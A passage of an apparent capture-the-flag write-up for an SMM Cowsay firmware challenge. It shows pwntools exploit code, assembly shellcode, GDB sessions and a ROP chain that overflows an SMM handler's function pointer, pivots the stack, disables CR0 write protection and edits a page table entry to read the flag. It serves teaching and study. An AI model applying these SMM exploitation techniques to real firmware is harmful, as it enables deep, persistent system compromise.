<span class="line"><span style="color:#B8A965">        super</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">AddAllSymbols</span><span style="color:#666666">,</span><span style="color:#C99076"> self</span><span style="color:#666666">).</span><span style="color:#B8A965">__init__</span><span style="color:#666666"> (</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">add-all-symbols</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">            gdb</span><span style="color:#666666">.</span><span style="color:#C99076">COMMAND_OBSCURE</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> gdb</span><span style="color:#666666">.</span><span style="color:#C99076">COMPLETE_NONE</span><span style="color:#666666">,</span><span style="color:#4D9375"> True</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    def</span><span style="color:#80A665"> invoke</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> from_tty</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#B8A965">        print</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Adding symbols for all EFI drivers...</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">        with</span><span style="color:#B8A965"> open</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">debug.log</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">            for</span><span style="color:#DBD7CAEE"> line </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">startswith</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Loading SMM driver at</span><span style="color:#C98A7D77">'</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    line </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    base </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">[</span><span style="color:#4C9A91">4</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#4D9375">                elif</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">startswith</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Loading driver at</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#CB7676"> or</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">startswith</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Loading PEIM at</span><span style="color:#C98A7D77">'</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    line </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    base </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">[</span><span style="color:#4C9A91">3</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#4D9375">                else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                    continue</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">                path </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">handout/edk2_artifacts/</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">[</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#666666">].</span><span style="color:#DBD7CAEE">replace</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">.efi</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">.debug</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#DBD7CAEE"> os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">path</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">isfile</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">path</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">execute</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">add-symbol-file </span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> path </span><span style="color:#CB7676">+</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D"> -readnow -o </span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> base</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">AddAllSymbols</span><span style="color:#666666">()</span></span>
<span class="line"></span></code></pre>
<p>The first part of the exploit is the same as for SMM Cowsay 1: get ahold of
<code>BootServices->AllocatePool</code> and <code>->LocateProtocol</code>, find the <code>SmmCommunication</code>
protocol, allocate some memory to write our message, and send it to <code>SmmCowsay</code>
through its SMI handler. The only thing that changes is <em>what we are sending</em>:
this time the <code>->Data</code> field of the <code>EFI_SMM_COMMUNICATE_HEADER</code> will be filled
with a string of 400 bytes of garbage plus 8 more to overwrite the function
pointer.</p>
<p>We will fill all unused general purpose register with easily identifiable values
so that we can see what is spilled on the stack:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD"># ... same code as for SMM Cowsay 1 up to the allocation of `buffer`</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B8A965">input</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Attach GDB now and press [ENTER] to continue...</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">'</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">utf-16-le</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 200</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">4141414141414141</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">code </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'''</span></span>
<span class="line"><span style="color:#C98A7D">    /* Copy data into allocated buffer */</span></span>
<span class="line"><span style="color:#C98A7D">    lea rsi, qword ptr [rip + data]</span></span>
<span class="line"><span style="color:#C98A7D">    mov rdi, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">buffer</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    mov rcx, </span><span style="color:#C99076">{</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">18</span><span style="color:#CB7676"> +</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">)</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    cld</span></span>
<span class="line"><span style="color:#C98A7D">    rep movsb</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span>
<span class="line"><span style="color:#C98A7D">    mov rcx, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">mSmmCommunication</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    mov rdx, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">buffer</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    xor r8, r8</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">Communicate</span><span style="color:#C99076">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    mov ebx, 0x0b0b0b0b</span></span>
<span class="line"><span style="color:#C98A7D">    mov esi, 0x01010101</span></span>
<span class="line"><span style="color:#C98A7D">    mov edi, 0x02020202</span></span>
<span class="line"><span style="color:#C98A7D">    mov ebp, 0x03030303</span></span>
<span class="line"><span style="color:#C98A7D">    mov r9 , 0x09090909</span></span>
<span class="line"><span style="color:#C98A7D">    mov r10, 0x10101010</span></span>
<span class="line"><span style="color:#C98A7D">    mov r11, 0x11111111</span></span>
<span class="line"><span style="color:#C98A7D">    mov r12, 0x12121212</span></span>
<span class="line"><span style="color:#C98A7D">    mov r13, 0x13131313</span></span>
<span class="line"><span style="color:#C98A7D">    mov r14, 0x14141414</span></span>
<span class="line"><span style="color:#C98A7D">    mov r15, 0x15151515</span></span>
<span class="line"><span style="color:#C98A7D">    call rax</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    test rax, rax</span></span>
<span class="line"><span style="color:#C98A7D">    jnz fail</span></span>
<span class="line"><span style="color:#C98A7D">    ret</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">fail:</span></span>
<span class="line"><span style="color:#C98A7D">    ud2</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">data:</span></span>
<span class="line"><span style="color:#C98A7D">    .octa </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">gEfiSmmCowsayCommunicationGuid</span><span style="color:#C99076">}</span><span style="color:#C98A7D"> /* Buffer->HeaderGuid */</span></span>
<span class="line"><span style="color:#C98A7D">    .quad </span><span style="color:#C99076">{</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">)</span><span style="color:#C99076">}</span><span style="color:#C98A7D">                   /* Buffer->MessageLength */</span></span>
<span class="line"><span style="color:#C98A7D">    /* payload will be appended here to serve as Buffer->Data */</span></span>
<span class="line"><span style="color:#C98A7D">'''</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#666666">().</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#666666">().</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">done</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#666666">()</span><span style="color:#758575DD"> # Let's see what happens</span></span>
<span class="line"></span></code></pre>
<p>And now we can start the exploit and attach GDB using the following script:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ cat script.gdb</span></span>
<span class="line"><span>target remote :1234</span></span>
<span class="line"><span></span></span>
<span class="line"><span>source gdb_plugin.py</span></span>
<span class="line"><span>add-all-symbols</span></span>
<span class="line"><span></span></span>
<span class="line"><span>break *(SmmCowsayHandler + 0x302)</span></span>
<span class="line"><span>continue</span></span>
<span class="line"><span></span></span></code></pre>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ gdb -x script.gdb</span></span>
<span class="line"><span>...</span></span>
<span class="line"><span>Breakpoint 1, 0x0000000007ee92c5 in SmmCowsayHandler (CommBufferSize=&#x3C;optimized out>, CommBuffer=0x69bb030, ...</span></span>
<span class="line"><span>(gdb) i r rax</span></span>
<span class="line"><span>rax            0x4141414141414141  4702111234474983745</span></span>
<span class="line"><span></span></span>
<span class="line"><span>(gdb) si</span></span>
<span class="line"><span>0x4141414141414141 in ?? ()</span></span>
<span class="line"><span></span></span>
<span class="line"><span>(gdb) x/100gx $rsp</span></span>
<span class="line"><span>0x7fb6a78:	0x0000000007ee92c7	0x0000000007ffa8d8</span></span>
<span class="line"><span>0x7fb6a88:	0x0000000007ff0bc5	0x00000000069bb030</span></span>
<span class="line"><span>0x7fb6a98:	0x0000000007fb6c38	0x0000000007fb6b80</span></span>
<span class="line"><span>...</span></span>
<span class="line"><span>...</span></span>
<span class="line"><span>...</span></span>
<span class="line"><span>0x7fb6b48:	0x00000000069bb018	0x0000000013131300</span></span>
<span class="line"><span>0x7fb6b58:	0x0000000014141414	0x0000000015151515</span></span>
<span class="line"><span></span></span></code></pre>
<p>It seems like R13 (except the LSB), R14 and R15 somehow got spilled on the stack
at <code>rsp + 0xe0</code>. After returning from the <code>call rax</code> the code in
<code>SmmCowsayHandler</code> does:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>(gdb) x/30i SmmCowsayHandler + 0x302</span></span>
<span class="line"><span>   0x7ee92c5 &#x3C;SmmCowsayHandler+770>:	call   rax</span></span>
<span class="line"><span>   0x7ee92c7 &#x3C;SmmCowsayHandler+772>:	test   bl,bl</span></span>
<span class="line"><span>   ... a bunch of useless stuff ...</span></span>
<span class="line"><span>   0x7ee92f7 &#x3C;SmmCowsayHandler+820>:	add    rsp,0x40</span></span>
<span class="line"><span>   0x7ee92fb &#x3C;SmmCowsayHandler+824>:	xor    eax,eax</span></span>
<span class="line"><span>   0x7ee92fd &#x3C;SmmCowsayHandler+826>:	pop    rbx</span></span>
<span class="line"><span>   0x7ee92fe &#x3C;SmmCowsayHandler+827>:	pop    rsi</span></span>
<span class="line"><span>   0x7ee92ff &#x3C;SmmCowsayHandler+828>:	pop    rdi</span></span>
<span class="line"><span>   0x7ee9300 &#x3C;SmmCowsayHandler+829>:	pop    r12</span></span>
<span class="line"><span>   0x7ee9302 &#x3C;SmmCowsayHandler+831>:	pop    r13</span></span>
<span class="line"><span>   0x7ee9304 &#x3C;SmmCowsayHandler+833>:	ret</span></span>
<span class="line"><span></span></span></code></pre>
<p>So at the time of that last <code>ret</code> we would have the registers spilled on the
stack a lot closer. Very conveniently, amongst the gadgets we dumped, there is a
<code>ret 0x70</code> at <code>VariableSmm.efi + 0x8a49</code>. We can use this gadget to to move RSP
<em>exactly</em> on top of the spilled R14, giving us the possibility to execute one
more gadget of the form <code>pop rsp; ret</code>, which would get the new value for RSP
from the R15 value on the stack! After this, we fully control the stack and we
can write a longer ROP chain.</p>
<h3 id="writing-the-real-rop-chain">Writing the real ROP chain</h3>
<p>After flipping the stack and starting the real ROP chain, we’ll need gadgets
for:</p>
<ul>
<li>Setting CR0 in order to be able to disable <code>CR0.WP</code> to be able to edit the
page table.</li>
<li>Write to memory at an arbitrary address to overwrite the page table entry for
the flag address.</li>
<li>Read from memory into a register to be able to get the flag.</li>
</ul>
<p>All of these can be easily found with a bit of patience, since we have <em>a lot</em>
of gadgets on our hands.</p>
<p>Since addresses don’t change, we don’t really need to worry about walking the
page table: we can just find the address of the page table entry for
<code>0x44440000</code> once using GDB and then hardcode it in the exploit:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>(gdb) set $lvl4_idx = (0x44440000 >> 12 + 9 + 9 + 9) &#x26; 0x1ff</span></span>
<span class="line"><span>(gdb) set $lvl3_idx = (0x44440000 >> 12 + 9 + 9) &#x26; 0x1ff</span></span>
<span class="line"><span>(gdb) set $lvl2_idx = (0x44440000 >> 12 + 9) &#x26; 0x1ff</span></span>
<span class="line"><span>(gdb) set $lvl1_idx = (0x44440000 >> 12) &#x26; 0x1ff</span></span>
<span class="line"><span>(gdb) set $lvl4_entry = *(unsigned long *)($cr3 + 8 * $lvl4_idx)</span></span>
<span class="line"><span>(gdb) set $lvl3_entry = *(unsigned long *)(($lvl4_entry &#x26; 0xffffffff000) + 8 * $lvl3_idx)</span></span>
<span class="line"><span>(gdb) set $lvl2_entry = *(unsigned long *)(($lvl3_entry &#x26; 0xffffffff000) + 8 * $lvl2_idx)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>(gdb) set $lvl1_entry_addr = ($lvl2_entry &#x26; 0xffffffff000) + 8 * $lvl1_idx</span></span>
<span class="line"><span>(gdb) set $lvl1_entry      = *(unsigned long *)$lvl1_entry_addr</span></span>
<span class="line"><span></span></span>
<span class="line"><span>(gdb) printf "PTE at 0x%lx, value = 0x%016lx\n", $lvl1_entry_addr, $lvl1_entry</span></span>
<span class="line"><span></span></span>
<span class="line"><span>PTE at 0x7ed0200, value = 0x8000000044440066</span></span>
<span class="line"><span></span></span></code></pre>
<p>Notice how <code>0x8000000044440066</code> has bit 63 set (NX) set and bits 0 and 1 unset
(not present, not writeable). We need to set bit 0 in order to mark the page as
present, so the value we want is <code>0x8000000044440067</code>.</p>
<p>Checking the value of CR0 from GDB we get <code>0x80010033</code>: turning OFF the WP bit
gives us <code>0x80000033</code>, so this is what we want to write into CR0 before trying
to edit the page table entry at <code>0x7ed0200</code>.</p>
<p>After finding the gadgets we need, this is what the real ROP chain looks like:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">ret_0x70 </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7F83000</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">8a49</span><span style="color:#758575DD"> # VariableSmm.efi + 0x8a49: ret 0x70</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload  </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">'</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">utf-16-le</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 200</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">ret_0x70</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">real_chain </span><span style="color:#666666">=</span><span style="color:#666666"> [</span></span>
<span class="line"><span style="color:#758575DD">    # Unset CR0.WP</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">7f8a184</span><span style="color:#666666"> ,</span><span style="color:#758575DD"> # pop rax ; ret</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">80000033</span><span style="color:#666666">,</span><span style="color:#758575DD"> # -> RAX</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">7fcf70d</span><span style="color:#666666"> ,</span><span style="color:#758575DD"> # mov cr0, rax ; wbinvd ; ret</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">    # Set PTE of flag page as present</span></span>
<span class="line"><span style="color:#758575DD">    # PTE at 0x7ed0200, original value = 0x8000000044440066</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">7f8a184</span><span style="color:#666666">         ,</span><span style="color:#758575DD"> # pop rax ; ret</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">7ed0200</span><span style="color:#666666">         ,</span><span style="color:#758575DD"> # -> RAX</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">7fc123d</span><span style="color:#666666">         ,</span><span style="color:#758575DD"> # pop rdx ; ret</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">8000000044440067</span><span style="color:#666666">,</span><span style="color:#758575DD"> # -> RDX</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">7fc9385</span><span style="color:#666666">         ,</span><span style="color:#758575DD"> # mov dword ptr [rax], edx ; xor eax, eax ;</span></span>
<span class="line"><span style="color:#758575DD">                        # pop rbx ; pop rbp ; pop r12 ; ret</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">1337</span><span style="color:#666666">,</span><span style="color:#758575DD"> # filler</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">1337</span><span style="color:#666666">,</span><span style="color:#758575DD"> # filler</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">1337</span><span style="color:#666666">,</span><span style="color:#758575DD"> # filler</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">    # Read flag into RAX and then let everything chain</span></span>
<span class="line"><span style="color:#758575DD">    # crash to simply leak it from the register dump</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">7ee8222</span><span style="color:#666666"> ,</span><span style="color:#758575DD"> # pop rsi ; ret (do not mess up RAX with sub/add)</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">0</span><span style="color:#666666">       ,</span><span style="color:#758575DD"> # -> RSI</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">7fc123d</span><span style="color:#666666"> ,</span><span style="color:#758575DD"> # pop rdx ; ret (do not mess up RAX with sub/add)</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">0</span><span style="color:#666666">       ,</span><span style="color:#758575DD"> # -> RDX</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">7ee82fe</span><span style="color:#666666"> ,</span><span style="color:#758575DD"> # pop rdi ; ret</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">44440000</span><span style="color:#666666">,</span><span style="color:#758575DD"> # -> RDI (flag address)</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">7ff7b2c</span><span style="color:#666666"> ,</span><span style="color:#758575DD"> # mov rax, qword ptr [rdi] ; sub rsi, rdx ; add rax, rsi ; ret</span></span>
<span class="line"><span style="color:#666666">]</span></span>
<span class="line"></span></code></pre>
<h3 id="putting-it-all-together">Putting it all together</h3>
<p>We can now write the real ROP chain into our allocated buffer (let’s say at
<code>buffer + 0x800</code> just to be safe), load the gadget for flipping the stack into
R14, the address of the new stack (i.e. <code>buffer + 0x800</code>) into R15, and go for
the kill.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD"># Transform real ROP chain into .quad directives to</span></span>
<span class="line"><span style="color:#758575DD"># easyly embed it in the shellcode:</span></span>
<span class="line"><span style="color:#758575DD">#</span></span>
<span class="line"><span style="color:#758575DD">#   .quad 0x7f8a184</span></span>
<span class="line"><span style="color:#758575DD">#   .quad 0x80000033</span></span>
<span class="line"><span style="color:#758575DD">#    ...</span></span>
<span class="line"><span style="color:#DBD7CAEE">real_chain_size </span><span style="color:#666666">=</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">real_chain</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span></span>
<span class="line"><span style="color:#DBD7CAEE">real_chain      </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">.quad </span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> +</span><span style="color:#C98A7D77"> '</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">.quad </span><span style="color:#C98A7D77">'</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#666666">(</span><span style="color:#B8A965">map</span><span style="color:#666666">(</span><span style="color:#B8A965">str</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> real_chain</span><span style="color:#666666">))</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">code </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'''</span></span>
<span class="line"><span style="color:#C98A7D">    /* Copy data into allocated buffer */</span></span>
<span class="line"><span style="color:#C98A7D">    lea rsi, qword ptr [rip + data]</span></span>
<span class="line"><span style="color:#C98A7D">    mov rdi, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">buffer</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    mov rcx, </span><span style="color:#C99076">{</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">18</span><span style="color:#CB7676"> +</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">)</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    cld</span></span>
<span class="line"><span style="color:#C98A7D">    rep movsb</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    /* Copy real ROP chain into buffer + 0x800 */</span></span>
<span class="line"><span style="color:#C98A7D">    lea rsi, qword ptr [rip + real_chain]</span></span>
<span class="line"><span style="color:#C98A7D">    mov rdi, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">buffer </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">800</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    mov rcx, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">real_chain_size</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    cld</span></span>
<span class="line"><span style="color:#C98A7D">    rep movsb</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span>
<span class="line"><span style="color:#C98A7D">    mov rcx, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">mSmmCommunication</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    mov rdx, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">buffer</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    xor r8, r8</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">Communicate</span><span style="color:#C99076">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    /* These two regs will spill on SMI stack */</span></span>
<span class="line"><span style="color:#C98A7D">    mov r14, 0x7fe5269         /* pop rsp; ret */</span></span>
<span class="line"><span style="color:#C98A7D">    mov r15, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">buffer </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">800</span><span style="color:#C99076">}</span><span style="color:#C98A7D">  /* -> RSP */</span></span>
<span class="line"><span style="color:#C98A7D">    call rax</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    test rax, rax</span></span>
<span class="line"><span style="color:#C98A7D">    jnz fail</span></span>
<span class="line"><span style="color:#C98A7D">    ret</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">fail:</span></span>
<span class="line"><span style="color:#C98A7D">    ud2</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">real_chain:</span></span>
<span class="line"><span style="color:#C99076">    {</span><span style="color:#DBD7CAEE">real_chain</span><span style="color:#C99076">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">data:</span></span>
<span class="line"><span style="color:#C98A7D">    .octa </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">gEfiSmmCowsayCommunicationGuid</span><span style="color:#C99076">}</span><span style="color:#C98A7D"> /* Buffer->HeaderGuid */</span></span>
<span class="line"><span style="color:#C98A7D">    .quad </span><span style="color:#C99076">{</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">)</span><span style="color:#C99076">}</span><span style="color:#C98A7D">                   /* Buffer->MessageLength */</span></span>
<span class="line"><span style="color:#C98A7D">    /* payload will be appended here to serve as Buffer->Data */</span></span>
<span class="line"><span style="color:#C98A7D">'''</span><span style="color:#666666">)</span></span>
<span class="line"></span>
